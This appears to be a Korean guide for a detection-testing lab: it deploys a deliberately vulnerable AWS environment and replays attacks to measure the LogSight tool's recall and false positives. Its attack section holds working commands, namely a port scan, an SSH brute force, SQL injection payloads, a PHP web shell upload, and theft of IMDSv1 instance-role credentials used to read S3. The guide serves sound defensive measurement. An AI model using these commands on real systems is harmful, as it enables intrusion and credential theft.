# AWS 실습으로 직접 측정하기 (재현 가이드)

내 AWS 계정에 작은 실습 환경(EC2+S3+IAM+CloudTrail)을 올리고, 내가 직접 공격을 재현해
**내가 아는 정답**으로 LogSight의 탐지 성능을 잰다. 시나리오를 규칙 만든 사람이 정하는
문제를 피하려고, **규칙을 고정한 뒤** 측정한다.

이 방법의 핵심은 "연결 고리"다. EC2 인스턴스 역할 자격증명을 훔쳐 S3를 읽으면 CloudTrail에
`assumed-role/<역할>/i-xxxx` 형태로 남는다(세션 이름 = 인스턴스 ID). 웹 침해(호스트)와 AWS
자원 접근이 한 사슬로 이어지는지가 LogSight가 풀어야 할 문제다.

---

## 0. 반드시 지킬 것 (먼저 읽기)

- **내 자원만.** 이 가이드는 **내가 만든 실습 자원에 대해서만** 공격을 재현한다. 제3자 시스템,
  공용 서비스, 남의 계정은 절대 대상이 아니다. AWS 이용약관(AUP)을 따른다.
- **DoS·대량 트래픽 금지.** 무차별 대입은 **수십 회 수준**으로만 재현한다. 네트워크를 가득
  채우는 공격(flooding)은 AUP 위반이며 하지 않는다. 포트 스캔도 내 인스턴스 1대로 한정한다.
- **자격증명을 저장소·채팅에 올리지 않는다.** 훔친 키, `.pem`, 계정 번호는 코드·커밋·메시지에
  넣지 않는다. 로그와 정답 파일은 `.gitignore`에 든 `data/`에만 둔다.
- **합성 데이터만.** S3의 "민감 데이터"는 가짜 CSV다. 실제 개인정보를 넣지 않는다.
- **IMDSv1은 실습용.** Terraform이 `http_tokens = "optional"`로 두는 건 탈취 사슬을 재현하기
  위해서다. 실제 운영에서는 절대 쓰지 않는다.
- **끝나면 지운다.** 측정이 끝나면 `terraform destroy`로 전부 내린다. 비용 알람을 먼저 건다.

---

## 1. 배포

사전 준비: AWS 계정, `aws` CLI 로그인(`aws sts get-caller-identity`로 확인), Terraform ≥ 1.3.

### 1-1. 비용 알람부터

실습은 `t3.micro` 1대 + S3 + CloudTrail 수준이라 몇 시간이면 1달러 안쪽이지만, 지우는 걸
잊으면 쌓인다. **배포 전에** 예산 알람을 건다(콘솔 → Billing → Budgets → `$5` 월 예산,
80%에서 메일).

### 1-2. 변수 채우기

```bash
cd lab/aws/terraform
cp terraform.tfvars.example terraform.tfvars
```

`terraform.tfvars`를 열어 최소 이것만 채운다:

```hcl
allowed_ip = "<내 공인 IP>/32"   # curl -s https://checkip.amazonaws.com 으로 확인. 0.0.0.0/0 금지(검증에서 막힘)
key_name   = ""                   # SSH로 들어가 서버 로그를 모으려면 미리 만든 EC2 키페어 이름을 넣는다
repo_url   = "https://github.com/minyoungyu/logsight.git"
repo_ref   = "main"               # 실습 사이트 코드를 가져올 브랜치
```

- `allowed_ip`는 22/80 포트를 **내 IP에서만** 열기 위한 것이다. 공용(0.0.0.0/0)은 변수 검증이
  막는다.
- `key_name`을 비우면 SSH 접속이 안 된다. nginx 로그를 모으려면 키페어가 필요하므로 채우는 걸
  권한다.

### 1-3. 올리기

```bash
terraform init
terraform plan      # 무엇이 만들어지는지 확인
terraform apply      # yes
```

끝나면 출력에서 `web_url`, `web_public_ip`, `instance_id`, `iam_role_name`,
`sensitive_bucket`, `logs_bucket`, `region`을 적어 둔다. `collect_hint`에 수집 명령이 나온다.

---

## 2. 공격 재현 (내 실습 자원에만)

각 단계를 **한 순간마다** 정답 파일에 기록한다(아래 3절). 나중에 기억으로 쓰지 않는다.
공격자 IP는 내 `allowed_ip`의 IP가 된다. 시작·종료 시각을 UTC로 적는다.

> 모두 내가 만든 `web_public_ip` 한 대에만 한다. 횟수는 "탐지에 필요한 최소"로 한다.

### 2-1. 포트 스캔 (T1046)

```bash
# 내 인스턴스 1대에만. -T4 정도, 전체 포트 아님
nmap -sS -F <web_public_ip>
```

VPC Flow Log에 짧은 시간 여러 포트로의 거절/시도가 남는다.

### 2-2. SSH 무차별 대입 (T1110) — 수십 회만

```bash
# hydra 등으로 20~30회 수준만. flooding 금지.
# (키페어 로그인이 정답이므로 암호 로그인은 대부분 실패로 남는다)
hydra -l ubuntu -P <작은_암호목록.txt> ssh://<web_public_ip> -t 4 -w 5
```

`/var/log/auth.log`에 실패 반복이 남는다. 20~30회를 넘기지 않는다.

### 2-3. SQL 인젝션 (T1190)

실습 사이트 `search.php`/`login.php`에 넣는다.

```bash
curl "http://<web_public_ip>/search.php?q=%27%20OR%201=1%20--%20"
curl -X POST "http://<web_public_ip>/login.php" --data "user=admin%27--&pass=x"
```

nginx access 로그에 인젝션 흔적이 남는다.

### 2-4. 웹셸 업로드·실행 (T1505.003)

실습 사이트 `upload.php`는 `.php` 업로드를 막지 못한다(의도된 취약점).

```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -F "file=@shell.php" "http://<web_public_ip>/upload.php"
curl "http://<web_public_ip>/uploads/shell.php?c=id"
```

access 로그에 업로드와 실행 요청이 남고, 웹 루트 사본에 `shell.php`가 남는다.

### 2-5. 인스턴스 역할 키 탈취 → S3 읽기 (T1552.005 → T1530) — 연결 고리

웹셸로 IMDSv1에서 자격증명을 뽑아, **그 키로** S3 민감 버킷을 읽는다.

```bash
# (1) 웹셸을 통해 인스턴스 메타데이터에서 임시 키를 꺼낸다 (IMDSv1)
ROLE=$(curl -s "http://<web_public_ip>/uploads/shell.php?c=curl%20-s%20http://169.254.169.254/latest/meta-data/iam/security-credentials/")
CREDS=$(curl -s "http://<web_public_ip>/uploads/shell.php?c=curl%20-s%20http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE")
# (2) 뽑은 AccessKeyId/SecretAccessKey/Token을 내 쪽 셸 환경변수에 넣는다 (화면·저장소에 남기지 않기)
export AWS_ACCESS_KEY_ID=... AWS_SECRET_ACCESS_KEY=... AWS_SESSION_TOKEN=...
# (3) 훔친 키로 민감 버킷을 읽는다 → CloudTrail에 assumed-role/<역할>/i-xxxx 로 남는다
aws s3 cp s3://<sensitive_bucket>/customers/export.csv - --region <region>
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
```

CloudTrail의 `GetObject`(S3 데이터 이벤트)가 EC2 인스턴스 역할 세션으로 찍힌다. 이게 호스트
침해와 AWS 자원 접근을 잇는 **연결 고리**다.

---

## 3. 정답(ground truth) 기록

공격을 재현하며 바로 적는다. 형식은 `logsight/web/measure.py`가 읽는 것과 같다(항목 목록).
템플릿은 `lab/aws/ground_truth.template.json`을 복사해 쓴다.

```json
{
  "scenario": "stolen-role-s3-read",
  "time_utc": "2026-10-29T10:42:10Z",
  "attacker_ip": "203.0.113.45",
  "technique": "T1530",
  "step_note": "웹셸로 IMDSv1 키 탈취 후 export.csv 읽기",
  "detectable": true,
  "expected_rules": ["CT_S3_BULK_READ"]
}
```

- `attacker_ip`: 내 `allowed_ip`의 IP. 정상 트래픽(배포·점검 접속)도 `"malicious": false`로 적어
  오탐을 잴 수 있게 한다.
- `detectable`: 접속·CloudTrail 로그에 흔적이 남으면 `true`. 앱 로그에만 남으면 `false`(사각지대).
- `expected_rules`: 규칙 ID. 목록은 `python -m logsight rules`로 본다. 모르겠으면 `technique`만
  적고 나중에 맞춘다.

정답 파일은 로그와 같은 폴더(`data/aws_lab/<stamp>/ground_truth.json`)에 둔다. **저장소에 올리지
않는다.**

---

## 4. 로그 수집

실습을 마치면 CloudTrail·VPC Flow Log(S3)와 서버 로그(nginx/auth)를 한 번에 내려받는다.

```bash
cd lab/aws
./collect.sh <logs_bucket> <region> <web_public_ip> <내키.pem> ubuntu
```

- CloudTrail·VPC Flow Log를 `data/aws_lab/<stamp>/`로 받고, SSH로 nginx·auth 로그를 긁어 온다.
- `to_environment.py`가 `aws describe-*`(읽기 전용)로 `environment.json`을 만든다. 설정 점검
  (IMDSv1, 과도한 IAM, 열린 포트)에 쓴다.
- 끝에 분석 명령을 출력한다.

---

## 5. 측정 (규칙 고정)

**규칙을 고정한 상태**로 돌린다. `--no-ai`라야 측정이 재현된다(AI 호출은 결과가 바뀔 수 있다).

### 5-1. AWS 사슬 분석 (CloudTrail 상관)

```bash
python -m logsight analyze data/aws_lab/<stamp>/ \
    --env data/aws_lab/<stamp>/environment.json --no-ai \
    --out data/aws_lab/<stamp>/report
```

연결 고리(탈취 역할 → S3)가 한 공격 사슬로 묶이는지, 설정 점검이 IMDSv1·과도 IAM·열린 포트를
짚는지 본다.

### 5-2. 웹 공격 재현율·오탐률 (정답 대조)

웹 로그는 기존 웹 파이프라인으로 수치화한다. 먼저 `profile.json`을 만든다(예시는
`docs/CTF_로그_수집_가이드.md` 4절과 동일한 형식):

```bash
python scripts/ctf_evaluate.py \
    --profile data/aws_lab/<stamp>/profile.json \
    --truth   data/aws_lab/<stamp>/ground_truth.json \
    --out     data/aws_lab/<stamp>/eval.json
```

재현율·정밀도·오탐률·F1과 놓친 항목·오탐 목록이 나온다. `detectable: false`는 재현율에서 빠지고
사각지대로만 표시된다.

### 5-3. 측정 전 확인

- [ ] `--no-ai`로 돌렸다(규칙만).
- [ ] 측정에 쓴 커밋 해시(`git rev-parse HEAD`)를 결과에 적었다. 규칙이 그 시점으로 고정됐다.
- [ ] 정답의 모든 공격 행에 `time_utc`와 `attacker_ip`가 있다.
- [ ] 정상 트래픽이 정답에 함께 있다(오탐 측정용).
- [ ] 측정이 끝날 때까지 규칙을 고치지 않았다(고친 뒤 다시 재면 과적합).

---

## 6. 정리 (반드시)

```bash
cd lab/aws/terraform
terraform destroy    # yes — EC2·S3·CloudTrail·IAM 모두 내린다
```

- `destroy` 후 콘솔에서 S3 버킷 2개와 CloudTrail이 지워졌는지 확인한다.
- `data/aws_lab/<stamp>/`의 로그·정답은 보관 기간을 정해 두고 측정 후 지운다.
- 비용 알람은 남겨 둬도 된다.

---

## 7. 결과를 보고서에 쓰기

- 측정은 "규칙 고정 → 미리 보지 않은 재현 공격 → 수치"라서 **독립 측정**에 해당한다.
  보고서 "AI 활용/구현" 근거로 재현율·오탐률·커밋 해시를 함께 적는다.
- 연결 고리(탈취 역할 → S3)를 사슬로 묶었는지가 핵심 결과다. 묶였으면 그 report.html의
  해당 사슬을, 못 묶었으면 무엇이 빠졌는지(규칙 보완 방향)를 적는다.
- 자격증명·계정 번호·실제 IP는 보고서에도 넣지 않는다. IP는 `203.0.113.x`(문서용 대역)로 바꿔
  적어도 된다.
